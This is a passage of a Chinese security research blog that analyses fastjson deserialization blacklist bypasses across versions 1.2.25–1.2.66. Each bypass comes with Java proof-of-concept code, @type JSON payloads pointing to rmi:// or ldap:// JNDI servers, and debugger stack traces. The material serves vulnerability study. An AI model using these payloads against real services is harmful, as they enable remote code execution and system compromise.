class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>需要目标服务端存在mybatis的jar包，版本要求：3.x.x&lt;Version&lt;3.5.0，也存在一些限制。</p><h2 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h2><p>JndiDataSourceFactory本来就不在黑名单里，自然就bypass了，这里只看一眼JNDI的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setProperties:44, JndiDataSourceFactory</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory</span><br><span class="line">deserialze:267, JavaBeanDeserializer</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test5</span><br></pre></td></tr></table></figure><p>JndiDataSourceFactory#setProperties存在JNDI注入，和JdbcRowSetImpl链子基本一样，不再分析。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698753142868-78aa3c22-d35c-4f9a-9030-99737647af46.png" alt="image.png"></p><h1 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25-1.2.47"></a>1.2.25-1.2.47</h1><p>和之前的绕过思路不同，本质是利用java.lang.Class内置类将恶意类加载进缓存，然后再使用fastjson反序列化去加载这个恶意类时，就会走缓存而不会走黑名单校验，进而成功bypass。</p><h2 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.47</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h2><p><strong>不需要设置AutoTypeSupport，大大提高了可利用性！</strong><br>下面是对Exp的影响，简单知道结论即可，无非是不同版本的checkAutoType里的逻辑有细微差别。</p><ul><li>不开启AutoTypeSupport：1.2.25-1.2.47通杀</li><li>开启AutoTypeSupport：1.2.25-1.2.32报错，1.2.33-1.2.47打通</li></ul><h2 id="调试分析-4"><a href="#调试分析-4" class="headerlink" title="调试分析"></a>调试分析</h2><p>这里默认不开启AutoTypeSupport，版本采用fastjson 1.2.47。<br>首先，在DefaultJSONParser#parseObject里解析JSON字符串，解析到第一个key是”a”，当检查到下一个字符是”{“的时候，程序认为a的值是一个对象，于是递归调用parseObject函数去解析这个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770139713-0b121b72-5cbe-4ece-b9ab-28e669fe6907.png" alt="image.png"><br>然后，继续解析又发现对象的key为”@type”，先调用checkAutoType()对传入的类名做检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770252631-4cf12606-07b4-42e9-92da-3c3be5ff6c36.png" alt="image.png"><br>显然可过检测，java.lang.Class是可以在HashMap里直接找到的，通过findClass直接加载到，不走黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:901, ParserConfig</span><br><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770549079-a7405030-6f34-4993-b522-2174c04fe139.png" alt="image.png"><br>于是加载到java.lang.Class对象并返回，下面就以类型为java.lang.Class为前提，对JSON字符串反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:384, DefaultJSONParser [2]</span><br><span class="line">parseObject:544, DefaultJSONParser [1]</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770901140-a93fb0f3-e0ba-40ed-85e1-2def8daf9f80.png" alt="image.png"><br>java.lang.Class默认调用MiscCodec#deserialze，它要求传入的JSON字符串的key&#x3D;”val”，不然抛异常；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserialze:227, MiscCodec</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771019637-d465aa1b-b99b-42d8-be01-4b2a062031fe.png" alt="image.png"><br>这也是payload为什么设置key为”val”的原因，如果key&#x3D;”val”的话，获取key的value，存入objVal&#x2F;strVal<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771218994-927e40d4-50fc-49c6-b567-109923a3f4ea.png" alt="image.png"><br>再调用TypeUtils#loadClass，加载key的value对应的类并返回，对应exp就是加载JdbcRowSetImpl对象并返回<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771618187-1ebf6032-7321-4c9e-90db-6a2569b671c5.png" alt="image.png"><br>到这里，实际上我们就已经达成了加载JdbcRowSetImpl类的目的，此时会在缓存mappings里存一份映射关系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1242, TypeUtils</span><br><span class="line">loadClass:1206, TypeUtils</span><br><span class="line">deserialze:335, MiscCodec</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698773169563-8ef49b85-8255-4c14-a61f-4c09a543679e.png" alt="image.png"><br>接下来就是类似的，解析”b”的值是个对象，然后又发现里边的key&#x3D;”@type”，走进checkAutoType里，但是这次它可以在mappings里找到JdbcRowSetImpl这个类，因为前面有缓存，直接在这返回，不走下面的黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getClassFromMapping:1202, TypeUtils</span><br><span class="line">checkAutoType:949, ParserConfig</span><br><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772581287-ec1ff9d6-5155-4356-b9a4-fb8cfb0a956a.png" alt="image.png"><br>至此，如图已绕过checkAutoType，加载到JdbcRowSetImpl这个类，后续利用JdbcRowSetImpl不再分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:319, DefaultJSONParser [2]</span><br><span class="line">parseObject:544, DefaultJSONParser [1]</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772695940-0e69df38-a016-4cb2-ad75-21d76ca6205a.png" alt="image.png"></p><h1 id="1-2-25-1-2-59"><a href="#1-2-25-1-2-59" class="headerlink" title="1.2.25-1.2.59"></a>1.2.25-1.2.59</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过禁用类黑名单。</p><h2 id="Exp-5"><a href="#Exp-5" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需开启AutoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.zaxxer&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;HikariCP&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;3.3.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// some configrations</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h2><ul><li>需开启AutoTypeSupport</li><li>需要HikariCP组件</li><li>利用JNDI，受到JDK版本的限制</li></ul><h2 id="调试分析-5"><a href="#调试分析-5" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="1-2-25-1-2-61（复现失败）"><a href="#1-2-25-1-2-61（复现失败）" class="headerlink" title="1.2.25-1.2.61（复现失败）"></a>1.2.25-1.2.61（复现失败）</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过黑名单</p><h2 id="Exp-6"><a href="#Exp-6" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启AutoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;commons-proxy&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\&quot;,\&quot;jndiName\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;,\&quot;Object\&quot;:\&quot;a\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h2><ul><li>要开autoTypeSupport</li><li>要commons-proxy组件</li><li>利用了JNDI，有JDK版本限制</li></ul><h2 id="调试分析-6"><a href="#调试分析-6" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="1-2-25-1-2-62"><a href="#1-2-25-1-2-62" class="headerlink" title="1.2.25-1.2.62"></a>1.2.25-1.2.62</h1><h2 id="JndiConverter链"><a href="#JndiConverter链" class="headerlink" title="JndiConverter链"></a>JndiConverter链</h2><h3 id="补丁分析-4"><a href="#补丁分析-4" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-7"><a href="#Exp-7" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    复现失败</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    需要在JavaEE环境运行或含有javaee依赖</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;slide&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;slide-kernel&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;cocoon&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;cocoon-slide&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.1.11&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;javax&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;8.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_62_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor\&quot;, \&quot;parameters\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Hashtable\&quot;,\&quot;java.naming.factory.initial\&quot;:\&quot;com.sun.jndi.rmi.registry.RegistryContextFactory\&quot;,\&quot;topic-factory\&quot;:\&quot;ldap://127.0.0.1:1234/Calc\&quot;&#125;, \&quot;namespace\&quot;:\&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="限制-7"><a href="#限制-7" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要slide、cocoon和javaee组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-7"><a href="#调试分析-7" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h2 id="CocoonSlide链"><a href="#CocoonSlide链" class="headerlink" title="CocoonSlide链"></a>CocoonSlide链</h2><h3 id="补丁分析-5"><a href="#补丁分析-5" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-8"><a href="#Exp-8" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;4.15&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_62_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// some configrations</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-8"><a href="#限制-8" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要xbean-reflect组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-8"><a href="#调试分析-8" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h1 id="1-2-25-1-2-66"><a href="#1-2-25-1-2-66" class="headerlink" title="1.2.25-1.2.66"></a>1.2.25-1.2.66</h1><h2 id="shiro链"><a href="#shiro链" class="headerlink" title="shiro链"></a>shiro链</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p><h3 id="Exp-9"><a href="#Exp-9" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">          &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.4&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/Calc\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-9"><a href="#限制-9" class="headerlink" 